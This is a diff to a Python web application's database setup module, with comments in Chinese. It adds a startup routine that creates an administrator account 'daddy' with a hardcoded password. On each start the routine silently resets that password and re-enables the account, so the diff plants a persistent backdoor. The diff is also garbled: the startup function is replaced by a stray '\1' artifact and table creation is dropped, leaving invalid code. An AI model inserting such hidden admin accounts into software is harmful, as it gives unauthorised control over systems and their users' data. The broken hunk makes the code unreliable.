@@ -61,6 +61,29 @@ engine = create_engine(
 SessionLocal = sessionmaker(bind=engine, autocommit=False, autoflush=False)
 Base = declarative_base()
 
+def _ensure_default_admin():
+    """确保存在管理员账户 daddy / 20240314AaA# （幂等）"""
+    try:
+        db = SessionLocal()
+        u = db.execute(select(AdminUser).where(AdminUser.username=="daddy")).scalar_one_or_none()
+        from passlib.hash import bcrypt as _bcrypt
+        new_hash = _bcrypt.hash("20240314AaA#")
+        if not u:
+            db.add(AdminUser(username="daddy", password_hash=new_hash, is_active=True)); db.commit()
+        else:
+            # 若密码不同则重置，并保证启用
+            try:
+                if not _bcrypt.verify("20240314AaA#", u.password_hash or ""):
+                    u.password_hash = new_hash
+            except Exception:
+                u.password_hash = new_hash
+            u.is_active = True
+            db.commit()
+        db.close()
+    except Exception as e:
+        print("ensure admin warn:", e)
+
+
 class MetaKV(Base):
     __tablename__ = "meta"
     key = Column(String(64), primary_key=True)
@@ -99,11 +122,8 @@ class TrackingFile(Base):
 
 # —— 启动时初始化数据库 ——
 @app.on_event("startup")
-def _init_db():
-    try:
-        Base.metadata.create_all(bind=engine, checkfirst=True)
-    except Exception as e:
-        print("DB init warn:", e)
+\1
+    _ensure_default_admin()
 
 # -------- 常用工具 --------
 def now_iso(): return datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
